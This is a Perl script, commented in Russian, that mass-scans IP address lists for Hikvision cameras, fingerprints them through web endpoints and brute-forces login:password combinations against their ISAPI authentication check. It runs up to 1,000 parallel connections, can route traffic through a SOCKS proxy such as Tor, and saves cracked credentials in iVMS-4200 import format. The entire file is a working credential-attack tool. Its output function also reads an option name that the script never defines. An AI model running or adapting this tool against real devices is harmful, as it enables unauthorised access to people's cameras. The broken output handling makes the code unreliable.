#!/usr/bin/env perl

use utf8;
use strict;
use warnings;

use List::Util qw/any uniq/;
use File::Slurp qw/read_file/;
use feature qw/say switch unicode_strings/;

use Coro;
use Coro::Select;
use Coro::Channel;

use URI;
use LWP::UserAgent;
use LWP::Protocol::socks;

use Term::ProgressBar;
use Getopt::Args qw/optargs opt usage/;

opt help => (
    isa     => 'Bool',
    alias   => 'h',
    ishelp  => 1,
    comment => 'Show help message',
);

opt targets_file => (
    isa     => 'Str',
    alias   => 'tf',
    comment => 'Input file path with targets list',
);

opt combo_file => (
    isa     => 'Str',
    alias   => 'cf',
    comment => 'Input file path with login:password combos',
);

opt logins_file => (
    isa     => 'Str',
    alias   => 'lf',
    comment => 'Input file path with logins',
);

opt passwords_file => (
    isa     => 'Str',
    alias   => 'pf',
    comment => 'Input file path with passwords',
);

opt results_file => (
    isa     => 'Str',
    alias   => 'r',
    comment => 'Results file path',
);

opt threads => (
    isa     => 'Int',
    alias   => 't',
    default => 1000,
    comment => 'Number of parallel connections',
);

opt generate_login_combo => (
    isa     => 'Bool',
    alias   => 'glc',
    comment => 'Generate login:login combo list',
);

opt timeout => (
    isa     => 'Int',
    alias   => 'to',
    default => 12,
    comment => 'Timeout for connection to target in seconds',
);

opt proxy => (
    isa     => 'Str',
    alias   => 'p',
    comment => 'Proxy address in format socks5://127.0.0.1:9050',
);

opt debug => (
    isa     => 'Bool',
    alias   => 'd',
    default => 0,
    hidden  => 1,
    comment => 'Enable additional logging',
);

# Parse args to hash and prevent empty @ARGV
my $args = optargs(@ARGV);

# Run usage func imported from Getopt::Args for autogenerate help message
die usage() unless $args and %$args and @ARGV and not $args->{help};

# debug
require Data::Dumper if $args->{debug};

# Хеш авторизационных данных для проверки на дубликаты
my %comboHash;

# Массив авторизационных данных вида login:password
my @comboList;

# Список логинов
my @logins;

# Список паролей
my @passwords;

# Загружаем данные из файлов
if ($args->{combo_file}) {
    @comboList = uniq read_file($args->{combo_file}, chomp => 1);
    say 'Combinations loaded from file: ' . scalar(@comboList);
}

if ($args->{logins_file} && ($args->{generate_login_combo} || $args->{passwords_file})) {
    @logins = uniq read_file($args->{logins_file}, chomp => 1);
    say 'Logins loaded from file: ' . scalar(@logins);

    if ($args->{passwords_file}) {
        @passwords = uniq read_file($args->{passwords_file}, chomp => 1);
        say 'Passwords loaded from file: ' . scalar(@passwords);
    }
}

# Добавляем текущие авторизационные данные в хеш
%comboHash = map {$_ => 1} @comboList;

# Генерируем новые комбинации логинов и паролей
if (@logins > 0 and @passwords > 0) {
    my $combo_count = scalar(@comboList);

    push @comboList, map {
        $comboHash{$_} = 1;
        $_
    } grep {
        !exists $comboHash{$_};
    } map {
        my $login = $_;
        map {"$login:$_"} @passwords;
    } @logins;
    say 'Generated combinations (login:password): ' . (scalar(@comboList) - $combo_count);
}

# Генерируем новые комбинации из логинов
if (@logins > 0 && $args->{generate_login_combo}) {
    my $combo_count = scalar(@comboList);

    push @comboList, map {
        $comboHash{$_} = 1;
        $_
    } grep {
        !exists $comboHash{$_}
    } map {"$_:$_"} @logins;
    say 'Generated combinations (login:login): ' . (scalar(@comboList) - $combo_count);
}
say 'Total generated combinations: ' . scalar(@comboList);

undef(@logins);
undef(@passwords);
undef(%comboHash);

# Читаем айпишники в массив
my @ipList = grep {defined $_ and $_ ne ''} uniq read_file($args->{targets_file}, chomp => 1);
say 'IP list size: ' . scalar(@ipList);
say 'The total number of combinations for testing: ' . scalar(@ipList) * scalar(@comboList);

# Создаём прогрессбар
my $progress = Term::ProgressBar->new({
    count => scalar(@ipList) * scalar(@comboList),
    name  => 'Bruteforcing',
    ETA   => 'linear'
});
$progress->update(0);

# Функция брутфорса логинов и паролей
sub bruteforce {
    my ($ip_address, $ua, $progress_bar, $combo_list) = @_;

    my $tested_combos = 0;
    my $password_found = 0;
    for my $combo (@$combo_list) {
        my ($login, $password) = split /:/, $combo;

        if (login($ip_address, $login, $password, $ua)) {
            $progress_bar->message('[Good Camera] ' . $login . ';' . $password . '@' . $ip_address);
            save_good($ip_address, $login, $password);

            $progress_bar->update($progress_bar->last_update + ($tested_combos - $progress_bar->last_update));
            $password_found = 1;
            last;
        }
        else {
            $tested_combos++;
            $progress_bar->update($progress_bar->last_update + 1);
        }
    }

    $progress_bar->message('[Bad Camera] ' . $ip_address)
        unless $password_found;

    return $password_found;
}

my $channel = Coro::Channel->new();
$channel->put($_) for @ipList;
$channel->shutdown;

# Создаем корутины
my @coroutines;
for (1 .. $args->{threads}) {
    push @coroutines, async {
        my $ua = LWP::UserAgent->new(
            timeout => $args->{timeout},
            proxy   => $args->{proxy} ? [ [ qw(http https) ] => $args->{proxy} ] : undef,
        );

        while (my $ip_address = $channel->get) {

            # Проверяем, является ли устройство камерой
            if (is_camera($ip_address, $ua, $progress)) {
                $progress->message('[Camera] ' . $ip_address);
                bruteforce($ip_address, $ua, $progress, \@comboList);
            }
            else {
                $progress->message('[Not Camera] ' . $ip_address);
                $progress->update($progress->last_update + scalar(@comboList));
            }
        }
    };
}

# Дожидаемся завершения выполнения всех корутин
$_->join for @coroutines;

# Обрабатываем ответ сервера пытаясь найти совпадение с сигнатурой
sub process_response {
    my ($resp, $progress_bar, $pattern, $dbg) = @_;
    my ($pattern_str) = Data::Dumper::Dumper($pattern) =~ m!^\$VAR1\s+=\s+(.+);\s*$!;

    my $status_line = $resp->status_line();
    my $no_connection = any {$status_line =~ $_} qr/^Can't connect/, qr/Connection refused/, qr/read timeout/;

    if ($dbg) {
        my $msg_type = $no_connection ? "No Connection" : "Error";
        my $msg = "[R][!] $msg_type: $status_line";
        $progress_bar->message($msg);
    }

    my $matched = (($resp->as_string() || '') =~ $pattern);
    my $msg_type = $matched ? "[+]" : "[-]";
    my $msg = "[S]$msg_type Signature [$pattern_str] " . ($matched ? "matched" : "not match");
    $progress_bar->message($msg);

    return $matched ? 1 : 0;
}

# Проверяем является ли девайс камерой
sub is_camera {
    my ($ip, $ua, $progress_bar, $patterns, $retries) = @_;
    return 0 unless ($ip && $ua);

    $retries //= 2;
    $patterns //= { # Использование короткой записи инициализации хэша
        'http://%s/doc/page/login.asp'                 => qr#Hikvision#i,
        'http://%s/doc/i18n/en/Common.json'            => qr#Hikvision#i,
        'http://%s/doc/i18n/en/Config.json'            => qr#Hikvision#i,
        'http://%s/SDK/activateStatus'                 => qr#Hikvision#i,
        'http://%s/ISAPI/Security/extern/capabilities' => qr#Hikvision#i,
        'http://%s/SDK/language'                       => qr#hikvision#i
    };

    my $success;
    for my $url_mask (keys %$patterns) {
        my $pattern = $patterns->{$url_mask};
        my $url = sprintf($url_mask, $ip);

        for my $i (0 .. $retries - 1) {
            my $resp = $ua->get($url);

            my $retry_msg = ($i == 0) ? "" : "[Retry " . ($i + 1) . "] ";
            my $request_msg = sprintf(
                "[R][i] %sRequest to url: %s [%s]",
                $retry_msg, $url, $resp->status_line()
            );
            $progress_bar->message($request_msg)
                if ($args->{debug});

            $success = process_response($resp, $progress_bar, $pattern, $args->{debug});
            last if $success == 0;
            return 1 if $success;
        }
    }

    return 0;
}

# Проверяет возможность авторизации с заданными учетными данными на камере с заданным IP
sub login {
    my ($ip, $username, $password, $ua) = @_;
    return 0 unless defined $ip && defined $username && defined $password && defined $ua;

    # Создаем URI для запроса
    my $uri = URI->new('http:');
    $uri->host_port($ip);
    $uri->path('/ISAPI/Security/userCheck');

    # Создаем HTTP-запрос с авторизацией
    my $req = HTTP::Request->new(GET => $uri);
    $req->authorization_basic($username, $password);
    my $resp = $ua->request($req);

    return 1 if $resp->is_success and ($resp->decoded_content || '') =~ m#<statusString>OK</statusString>#;
    return 0;
}

# Сохраняем IP-адрес, имя пользователя и пароль в файл iVMS-4200
sub save_good {
    my ($ip, $login, $password) = @_;
    return 0 unless defined $ip && defined $login && defined $password;

    open(GOOD, '>>', $args->{output})
        or die "Can't open output good file:" . $args->{output} . " [$!]";
    print GOOD qq("PokPokPok","0","$ip","8000","0","$login","$password","0","0","0","0"$/);
    close(GOOD);
}
